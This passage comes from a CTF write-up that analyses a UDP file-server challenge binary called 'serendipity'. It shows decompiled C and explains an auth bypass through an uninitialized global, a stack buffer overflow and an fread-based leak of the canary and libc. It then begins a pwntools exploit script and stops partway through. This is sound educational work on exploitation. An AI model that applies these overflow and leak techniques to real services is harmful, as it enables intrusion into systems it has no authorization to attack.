</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> v2; <span style="color:#75715e">// eax
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> v3; <span style="color:#75715e">// eax
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> v4; <span style="color:#75715e">// eax
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> i; <span style="color:#75715e">// [rsp+14h] [rbp-Ch]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">!</span>strncmp(s1, (<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)a2<span style="color:#f92672">-&gt;</span>mess, <span style="color:#ae81ff">32uLL</span>) )
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    memset(<span style="color:#f92672">&amp;</span>a1[<span style="color:#ae81ff">1</span>].sa_data[<span style="color:#ae81ff">2</span>], <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0x200uLL</span>);
</span></span><span style="display:flex;"><span>    strcpy(<span style="color:#f92672">&amp;</span>a1[<span style="color:#ae81ff">1</span>].sa_data[<span style="color:#ae81ff">2</span>], <span style="color:#e6db74">&#34;auth successfully</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>    v3 <span style="color:#f92672">=</span> strlen(<span style="color:#f92672">&amp;</span>a1[<span style="color:#ae81ff">1</span>].sa_data[<span style="color:#ae81ff">2</span>]);
</span></span><span style="display:flex;"><span>    send_to(a1, (<span style="color:#66d9ef">__int64</span>)<span style="color:#f92672">&amp;</span>a1[<span style="color:#ae81ff">1</span>].sa_data[<span style="color:#ae81ff">2</span>], v3);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> ( i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">3</span>; <span style="color:#f92672">++</span>i )
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">!*</span>((_QWORD <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>thread_id <span style="color:#f92672">+</span> <span style="color:#ae81ff">2</span> <span style="color:#f92672">*</span> i) )
</span></span><span style="display:flex;"><span>      {
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">*</span>((_QWORD <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>thread_id <span style="color:#f92672">+</span> <span style="color:#ae81ff">2</span> <span style="color:#f92672">*</span> i) <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>(_QWORD <span style="color:#f92672">*</span>)generate_rand(<span style="color:#ae81ff">8</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">thread</span>[<span style="color:#ae81ff">2</span> <span style="color:#f92672">*</span> i] <span style="color:#f92672">=</span> time(<span style="color:#ae81ff">0LL</span>) <span style="color:#f92672">+</span> <span style="color:#ae81ff">60</span>;
</span></span><span style="display:flex;"><span>        memset(<span style="color:#f92672">&amp;</span>a1[<span style="color:#ae81ff">1</span>].sa_data[<span style="color:#ae81ff">2</span>], <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0x200uLL</span>);
</span></span><span style="display:flex;"><span>        strncpy(<span style="color:#f92672">&amp;</span>a1[<span style="color:#ae81ff">1</span>].sa_data[<span style="color:#ae81ff">2</span>], (<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>thread_id <span style="color:#f92672">+</span> <span style="color:#ae81ff">16</span> <span style="color:#f92672">*</span> i, <span style="color:#ae81ff">8uLL</span>);
</span></span><span style="display:flex;"><span>        send_to(a1, (<span style="color:#66d9ef">__int64</span>)<span style="color:#f92672">&amp;</span>a1[<span style="color:#ae81ff">1</span>].sa_data[<span style="color:#ae81ff">2</span>], <span style="color:#ae81ff">8</span>);
</span></span><span style="display:flex;"><span>        create_new_thread((<span style="color:#66d9ef">__int64</span>)a1, (<span style="color:#66d9ef">__int64</span>)a2, i);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span>;
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    memset(<span style="color:#f92672">&amp;</span>a1[<span style="color:#ae81ff">1</span>].sa_data[<span style="color:#ae81ff">2</span>], <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0x200uLL</span>);
</span></span><span style="display:flex;"><span>    strcpy(<span style="color:#f92672">&amp;</span>a1[<span style="color:#ae81ff">1</span>].sa_data[<span style="color:#ae81ff">2</span>], <span style="color:#e6db74">&#34;only 4 sessions at a time</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>    v4 <span style="color:#f92672">=</span> strlen(<span style="color:#f92672">&amp;</span>a1[<span style="color:#ae81ff">1</span>].sa_data[<span style="color:#ae81ff">2</span>]);
</span></span><span style="display:flex;"><span>    send_to(a1, (<span style="color:#66d9ef">__int64</span>)<span style="color:#f92672">&amp;</span>a1[<span style="color:#ae81ff">1</span>].sa_data[<span style="color:#ae81ff">2</span>], v4);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">else</span>
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    memset(<span style="color:#f92672">&amp;</span>a1[<span style="color:#ae81ff">1</span>].sa_data[<span style="color:#ae81ff">2</span>], <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0x200uLL</span>);
</span></span><span style="display:flex;"><span>    strcpy(<span style="color:#f92672">&amp;</span>a1[<span style="color:#ae81ff">1</span>].sa_data[<span style="color:#ae81ff">2</span>], <span style="color:#e6db74">&#34;auth failed</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>    v2 <span style="color:#f92672">=</span> strlen(<span style="color:#f92672">&amp;</span>a1[<span style="color:#ae81ff">1</span>].sa_data[<span style="color:#ae81ff">2</span>]);
</span></span><span style="display:flex;"><span>    send_to(a1, (<span style="color:#66d9ef">__int64</span>)<span style="color:#f92672">&amp;</span>a1[<span style="color:#ae81ff">1</span>].sa_data[<span style="color:#ae81ff">2</span>], v2);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>It compares the encrypted data from the <code>opcode 0x101</code> function with the global variable <code>s1</code>.</p>
<p>I can use the trick I learned from the first challenge to predict the data, but it&rsquo;s not necessary because <code>s1</code> is initialized when I use <code>opcode 0x101</code>. So basically, if I don&rsquo;t initialize it, the <code>s1</code> variable remains uninitialized and I can bypass it with a <code>NULL</code> byte.</p>
<p>If the authentication process is successful, a session ID is generated and stored in the global variable <code>thread_id</code>. It is then sent to the user. Following this, a new thread is created using the <code>start_routine()</code> function with the struct address and data passed in as two arguments for the thread.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#66d9ef">__fastcall</span> <span style="color:#a6e22e">create_new_thread</span>(<span style="color:#66d9ef">__int64</span> a1, <span style="color:#66d9ef">__int64</span> a2, <span style="color:#66d9ef">int</span> a3)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  _DWORD <span style="color:#f92672">*</span>arg; <span style="color:#75715e">// [rsp+28h] [rbp-8h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>  arg <span style="color:#f92672">=</span> calloc(<span style="color:#ae81ff">1uLL</span>, <span style="color:#ae81ff">0x10uLL</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">*</span>(_QWORD <span style="color:#f92672">*</span>)arg <span style="color:#f92672">=</span> a1;
</span></span><span style="display:flex;"><span>  arg[<span style="color:#ae81ff">2</span>] <span style="color:#f92672">=</span> a3;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> pthread_create(<span style="color:#f92672">&amp;</span>qword_60E0[a3], <span style="color:#ae81ff">0LL</span>, (<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>(<span style="color:#f92672">*</span>)(<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>))start_routine, arg);
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p><code>start_routine</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span><span style="color:#66d9ef">__fastcall</span> <span style="color:#a6e22e">start_routine</span>(_DWORD <span style="color:#f92672">*</span>a1)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> v1; <span style="color:#75715e">// eax
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> v3; <span style="color:#75715e">// eax
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  size_t v4; <span style="color:#75715e">// rax
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> v5; <span style="color:#75715e">// eax
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> v6; <span style="color:#75715e">// eax
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> v7; <span style="color:#75715e">// [rsp+1Ch] [rbp-344h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">sockaddr</span> <span style="color:#f92672">*</span>v8; <span style="color:#75715e">// [rsp+20h] [rbp-340h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  read_file <span style="color:#f92672">*</span>buf; <span style="color:#75715e">// [rsp+28h] [rbp-338h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  FILE <span style="color:#f92672">*</span>stream; <span style="color:#75715e">// [rsp+30h] [rbp-330h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">__int64</span> s; <span style="color:#75715e">// [rsp+40h] [rbp-320h] BYREF
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> type; <span style="color:#75715e">// [rsp+48h] [rbp-318h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int16</span> size; <span style="color:#75715e">// [rsp+4Ch] [rbp-314h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  _BYTE v14[<span style="color:#ae81ff">258</span>]; <span style="color:#75715e">// [rsp+4Eh] [rbp-312h] BYREF
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">char</span> dest[<span style="color:#ae81ff">8</span>]; <span style="color:#75715e">// [rsp+150h] [rbp-210h] BYREF
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">__int64</span> v16; <span style="color:#75715e">// [rsp+158h] [rbp-208h] BYREF
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">char</span> ptr[<span style="color:#ae81ff">264</span>]; <span style="color:#75715e">// [rsp+250h] [rbp-110h] BYREF
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int64</span> v18; <span style="color:#75715e">// [rsp+358h] [rbp-8h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>  v18 <span style="color:#f92672">=</span> __readfsqword(<span style="color:#ae81ff">0x28u</span>);
</span></span><span style="display:flex;"><span>  v8 <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>(<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">sockaddr</span> <span style="color:#f92672">**</span>)a1;
</span></span><span style="display:flex;"><span>  v7 <span style="color:#f92672">=</span> a1[<span style="color:#ae81ff">2</span>];
</span></span><span style="display:flex;"><span>  buf <span style="color:#f92672">=</span> (read_file <span style="color:#f92672">*</span>)calloc(<span style="color:#ae81ff">1uLL</span>, <span style="color:#ae81ff">0x1000uLL</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">while</span> ( <span style="color:#ae81ff">1</span> )
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span> ( <span style="color:#ae81ff">1</span> )
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>      memset(<span style="color:#f92672">&amp;</span>s, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0x110uLL</span>);
</span></span><span style="display:flex;"><span>      memset(dest, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0x100uLL</span>);
</span></span><span style="display:flex;"><span>      memset(ptr, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0x100uLL</span>);
</span></span><span style="display:flex;"><span>      read(p0[<span style="color:#ae81ff">2</span> <span style="color:#f92672">*</span> v7], buf, <span style="color:#ae81ff">0x1000uLL</span>);
</span></span><span style="display:flex;"><span>      s <span style="color:#f92672">=</span> buf<span style="color:#f92672">-&gt;</span>session;
</span></span><span style="display:flex;"><span>      type <span style="color:#f92672">=</span> buf<span style="color:#f92672">-&gt;</span>type;
</span></span><span style="display:flex;"><span>      size <span style="color:#f92672">=</span> buf<span style="color:#f92672">-&gt;</span>size;
</span></span><span style="display:flex;"><span>      memcpy(v14, buf<span style="color:#f92672">-&gt;</span>file_name, size);
</span></span><span style="display:flex;"><span>      memcpy(dest, <span style="color:#e6db74">&#34;./files/&#34;</span>, <span style="color:#66d9ef">sizeof</span>(dest));
</span></span><span style="display:flex;"><span>      memcpy(<span style="color:#f92672">&amp;</span>v16, v14, <span style="color:#ae81ff">0xF0uLL</span>);
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> ( strstr(dest, <span style="color:#e6db74">&#34;..&#34;</span>) )
</span></span><span style="display:flex;"><span>      {
</span></span><span style="display:flex;"><span>        memset(<span style="color:#f92672">&amp;</span>v8[<span style="color:#ae81ff">1</span>].sa_data[<span style="color:#ae81ff">2</span>], <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0x200uLL</span>);
</span></span><span style="display:flex;"><span>        strcpy(<span style="color:#f92672">&amp;</span>v8[<span style="color:#ae81ff">1</span>].sa_data[<span style="color:#ae81ff">2</span>], <span style="color:#e6db74">&#34;invalid file</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>        v1 <span style="color:#f92672">=</span> strlen(<span style="color:#f92672">&amp;</span>v8[<span style="color:#ae81ff">1</span>].sa_data[<span style="color:#ae81ff">2</span>]);
</span></span><span style="display:flex;"><span>        send_to(v8, (<span style="color:#66d9ef">__int64</span>)<span style="color:#f92672">&amp;</span>v8[<span style="color:#ae81ff">1</span>].sa_data[<span style="color:#ae81ff">2</span>], v1);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0LL</span>;
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">!</span>type )
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> ( type <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span> )
</span></span><span style="display:flex;"><span>      {
</span></span><span style="display:flex;"><span>        memset(<span style="color:#f92672">&amp;</span>v8[<span style="color:#ae81ff">1</span>].sa_data[<span style="color:#ae81ff">2</span>], <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0x200uLL</span>);
</span></span><span style="display:flex;"><span>        strcpy(<span style="color:#f92672">&amp;</span>v8[<span style="color:#ae81ff">1</span>].sa_data[<span style="color:#ae81ff">2</span>], <span style="color:#e6db74">&#34;under construction</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>        v6 <span style="color:#f92672">=</span> strlen(<span style="color:#f92672">&amp;</span>v8[<span style="color:#ae81ff">1</span>].sa_data[<span style="color:#ae81ff">2</span>]);
</span></span><span style="display:flex;"><span>        send_to(v8, (<span style="color:#66d9ef">__int64</span>)<span style="color:#f92672">&amp;</span>v8[<span style="color:#ae81ff">1</span>].sa_data[<span style="color:#ae81ff">2</span>], v6);
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    stream <span style="color:#f92672">=</span> fopen(dest, <span style="color:#e6db74">&#34;r&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">!</span>stream )
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>    fread(ptr, <span style="color:#ae81ff">0x100uLL</span>, <span style="color:#ae81ff">1uLL</span>, stream);
</span></span><span style="display:flex;"><span>    memset(<span style="color:#f92672">&amp;</span>v8[<span style="color:#ae81ff">1</span>].sa_data[<span style="color:#ae81ff">2</span>], <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0x200uLL</span>);
</span></span><span style="display:flex;"><span>    v4 <span style="color:#f92672">=</span> strlen(ptr);
</span></span><span style="display:flex;"><span>    strncpy(<span style="color:#f92672">&amp;</span>v8[<span style="color:#ae81ff">1</span>].sa_data[<span style="color:#ae81ff">2</span>], ptr, v4);
</span></span><span style="display:flex;"><span>    v5 <span style="color:#f92672">=</span> strlen(<span style="color:#f92672">&amp;</span>v8[<span style="color:#ae81ff">1</span>].sa_data[<span style="color:#ae81ff">2</span>]);
</span></span><span style="display:flex;"><span>    send_to(v8, (<span style="color:#66d9ef">__int64</span>)<span style="color:#f92672">&amp;</span>v8[<span style="color:#ae81ff">1</span>].sa_data[<span style="color:#ae81ff">2</span>], v5);
</span></span><span style="display:flex;"><span>    fclose(stream);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  memset(<span style="color:#f92672">&amp;</span>v8[<span style="color:#ae81ff">1</span>].sa_data[<span style="color:#ae81ff">2</span>], <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0x200uLL</span>);
</span></span><span style="display:flex;"><span>  strcpy(<span style="color:#f92672">&amp;</span>v8[<span style="color:#ae81ff">1</span>].sa_data[<span style="color:#ae81ff">2</span>], <span style="color:#e6db74">&#34;file can&#39;t be read</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>  v3 <span style="color:#f92672">=</span> strlen(<span style="color:#f92672">&amp;</span>v8[<span style="color:#ae81ff">1</span>].sa_data[<span style="color:#ae81ff">2</span>]);
</span></span><span style="display:flex;"><span>  send_to(v8, (<span style="color:#66d9ef">__int64</span>)<span style="color:#f92672">&amp;</span>v8[<span style="color:#ae81ff">1</span>].sa_data[<span style="color:#ae81ff">2</span>], v3);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0LL</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>It&rsquo;s read data from the pipe read of the current session. You may notice that in the main function, it has checked if the first 8 bytes match with the session id, it will perform to write in the pipe_write of this thread. So, I can easily manage communication between them.</p>
<h2 id="read-primitive">Read Primitive</h2>
<pre tabindex="0"><code>    ~/CTF/Pwnable/2023/wc2023/serendipity    master !1 ?38                                                                           w1n_gl0ry@phis1Ng 
 ls files                                                                                                                                                        
dance_of_the_petals  echoes_of_dawn  lullaby_of_the_rain  moonlit_embrace  whispers_of_serenity
</code></pre><p>Basically, the function take the message as the argument to perform read in this file we choose.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">read_file</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> session[<span style="color:#ae81ff">8</span>];
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">unsigned</span> int32 type;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">unsigned</span> int16 size;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> file_name[<span style="color:#ae81ff">4082</span>];
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Notice that the <code>file_name</code> field we have manage up to 4082 bytes and the <code>size</code> file up to 0xfff bytes.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>memset(<span style="color:#f92672">&amp;</span>s, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0x110uLL</span>);
</span></span><span style="display:flex;"><span>memset(dest, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0x100uLL</span>);
</span></span><span style="display:flex;"><span>memset(ptr, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0x100uLL</span>);
</span></span><span style="display:flex;"><span>read(p0[<span style="color:#ae81ff">2</span> <span style="color:#f92672">*</span> v7], buf, <span style="color:#ae81ff">0x1000uLL</span>);
</span></span><span style="display:flex;"><span>s <span style="color:#f92672">=</span> buf<span style="color:#f92672">-&gt;</span>session;
</span></span><span style="display:flex;"><span>type <span style="color:#f92672">=</span> buf<span style="color:#f92672">-&gt;</span>type;
</span></span><span style="display:flex;"><span>size <span style="color:#f92672">=</span> buf<span style="color:#f92672">-&gt;</span>size;
</span></span><span style="display:flex;"><span>memcpy(v14, buf<span style="color:#f92672">-&gt;</span>file_name, size);
</span></span><span style="display:flex;"><span>memcpy(dest, <span style="color:#e6db74">&#34;./files/&#34;</span>, <span style="color:#66d9ef">sizeof</span>(dest));
</span></span></code></pre></div><p>However, the <code>v14</code> has only 258 bytes, so we can easily perform overflow.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>fread(ptr, <span style="color:#ae81ff">0x100uLL</span>, <span style="color:#ae81ff">1uLL</span>, stream);
</span></span><span style="display:flex;"><span>memset(<span style="color:#f92672">&amp;</span>v8[<span style="color:#ae81ff">1</span>].sa_data[<span style="color:#ae81ff">2</span>], <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0x200uLL</span>);
</span></span><span style="display:flex;"><span>v4 <span style="color:#f92672">=</span> strlen(ptr);
</span></span><span style="display:flex;"><span>strncpy(<span style="color:#f92672">&amp;</span>v8[<span style="color:#ae81ff">1</span>].sa_data[<span style="color:#ae81ff">2</span>], ptr, v4);
</span></span><span style="display:flex;"><span>v5 <span style="color:#f92672">=</span> strlen(<span style="color:#f92672">&amp;</span>v8[<span style="color:#ae81ff">1</span>].sa_data[<span style="color:#ae81ff">2</span>]);
</span></span><span style="display:flex;"><span>send_to(v8, (<span style="color:#66d9ef">__int64</span>)<span style="color:#f92672">&amp;</span>v8[<span style="color:#ae81ff">1</span>].sa_data[<span style="color:#ae81ff">2</span>], v5);
</span></span><span style="display:flex;"><span>fclose(stream);
</span></span></code></pre></div><p>The <code>fread()</code> function does not add a null byte at the end of a string, which means that we can make the <code>v4</code> variable larger than the capacity of the <code>ptr</code> variable. This creates a powerful read primitive that allows for easy setup to leak the canary and libc address.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> args<span style="color:#f92672">.</span>LOCAL:
</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">=</span>process(<span style="color:#e6db74">&#39;./serendipity_patched&#39;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> args<span style="color:#f92672">.</span>GDB:
</span></span><span style="display:flex;"><span>        cmd<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&#34;&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        init-pwndbg
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        brva 0x0000000000002FD7
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        &#34;&#34;&#34;</span>
</span></span><span style="display:flex;"><span>        gdb<span style="color:#f92672">.</span>attach(io, cmd)
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">=</span>remote(<span style="color:#e6db74">&#39;157.245.147.89&#39;</span>, <span style="color:#ae81ff">25201</span>, typ<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;udp&#34;</span>)
</span></span><span style="display:flex;"><span>elf<span style="color:#f92672">=</span>context<span style="color:#f92672">.</span>binary<span style="color:#f92672">=</span>ELF(<span style="color:#e6db74">&#39;./serendipity_patched&#39;</span>)
</span></span><span style="display:flex;"><span>libc<span style="color:#f92672">=</span>ELF(<span style="color:#e6db74">&#39;./libc.so.6&#39;</span>) 
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>interactive()                       
</span></span></code></pre></div><p>I use this code to easily debug and connect with a server using <code>nc -u 0 9981</code> on my local machine.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> ctypes <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> socket 
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> time <span style="color:#f92672">import</span> sleep 
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> sys
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>libc<span style="color:#f92672">=</span>ELF(<span style="color:#e6db74">&#39;./libc.so.6&#39;</span>)
</span></span><span style="display:flex;"><span>glibc <span style="color:#f92672">=</span> cdll<span style="color:#f92672">.</span>LoadLibrary(<span style="color:#e6db74">&#39;libc.so.6&#39;</span>)
</span></span><span style="display:flex;"><span><span style="color:#75715e">#io=remote(&#39;157.245.147.89&#39;, 24210, typ=&#34;udp&#34;)</span>
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">=</span>remote(<span style="color:#e6db74">&#39;0&#39;</span>, <span style="color:#ae81ff">9981</span>, typ<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;udp&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>opcode<span style="color:#f92672">=</span>[<span style="color:#ae81ff">0x301</span>, <span style="color:#ae81ff">0x101</span>, <span style="color:#ae81ff">0x201</span>]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">printdata</span>(size, data):
</span></span><span style="display:flex;"><span>    pl<span style="color:#f92672">=</span>p32(<span style="color:#ae81ff">0x70303070</span>)
</span></span><span style="display:flex;"><span>    pl<span style="color:#f92672">+=</span>p32(opcode[<span style="color:#ae81ff">0</span>])
</span></span><span style="display:flex;"><span>    pl<span style="color:#f92672">+=</span>p16(size)
</span></span><span style="display:flex;"><span>    pl<span style="color:#f92672">+=</span>data
</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>send(pl)
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>plain<span style="color:#f92672">=</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&#39;</span>
</span></span><span style="display:flex;"><span>session<span style="color:#f92672">=</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&#39;</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">genarate_rand_string</span>(size<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>, data<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>):
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">global</span> plain
</span></span><span style="display:flex;"><span>    pl<span style="color:#f92672">=</span>p32(<span style="color:#ae81ff">0x70303070</span>)
</span></span><span style="display:flex;"><span>    pl<span style="color:#f92672">+=</span>p32(opcode[<span style="color:#ae81ff">1</span>])
</span></span><span style="display:flex;"><span>    pl<span style="color:#f92672">+=</span>p16(size)
</span></span><span style="display:flex;"><span>    pl<span style="color:#f92672">+=</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">100</span>
